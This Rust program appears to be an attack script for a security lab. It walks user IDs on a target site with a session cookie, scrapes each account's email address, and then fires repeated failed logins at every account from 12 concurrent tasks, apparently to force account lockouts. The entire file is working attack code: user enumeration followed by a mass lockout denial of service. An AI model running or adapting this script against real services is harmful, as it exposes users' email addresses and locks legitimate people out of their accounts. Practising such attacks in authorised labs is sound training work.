use reqwest;
use select::document::Document;
use select::predicate::Name;

const TARGET_URL: &str = "https://www-<WHATEVER>.ha-target.com";
const COOKIE: &str = "COOKIES_HERE";
const THREADS: usize = 12;
const LOGIN_ATTEMPTS: usize = 10;
const SKIP_USER: &str = "student@ha-target.com";

#[tokio::main]
async fn main() {
    let users = enumerate_users().await;

    println!("Found {} users", users.len());

    let user_chunks = users.chunks(users.len() / THREADS + 1).map(|chunk| chunk.to_vec()).collect::<Vec<Vec<String>>>();

    let mut chunk_iter = user_chunks.into_iter();
    let mut threads = vec![];
    for i in 0..THREADS {
        let chunk = chunk_iter.next().unwrap();
        println!("Starting thread {} with {} users", i, chunk.len());
        threads.push(tokio::spawn(async move {
            for user in chunk {
                login_to_email(&user).await;
            }
        }));
    }

    for thread in threads {
        thread.await.unwrap();
    }
}


async fn enumerate_users() -> Vec<String> {
    let mut users = vec![];
    for user_number in 1..200 {
        let url = format!("{}/users/{}", TARGET_URL, user_number);
        println!("Trying {}", url);
        let response = reqwest::Client::new()
            .get(&url)
            .header("Cookie", COOKIE)
            .send()
            .await;

        match response {
            Ok(response) => {
                if response.status().is_success() {
                    let email = parse_email(&response.text().await.unwrap());
                    println!("Found user {} -> {}", user_number, email);

                    if email != SKIP_USER {
                        users.push(email);
                    }
                }
            }
            Err(_) => {
                println!("Failed to get {}", url);
            }
        }
    }

    users
}

fn parse_email(body: &str) -> String {
    Document::from(body)
        .find(Name("p"))
        .next()
        .unwrap()
        .text()
        .trim()
        .to_string()
}

async fn login_to_email(email: &str) {
    let url = format!("{}/login", TARGET_URL);
    let params = [("email", email), ("password", "okqsldkakjnd")];
    println!("Logging in to {}", email);
    for _ in 0..LOGIN_ATTEMPTS {
        let _ = reqwest::Client::new()
            .post(&url)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .form(&params)
            .send()
            .await;
    }
}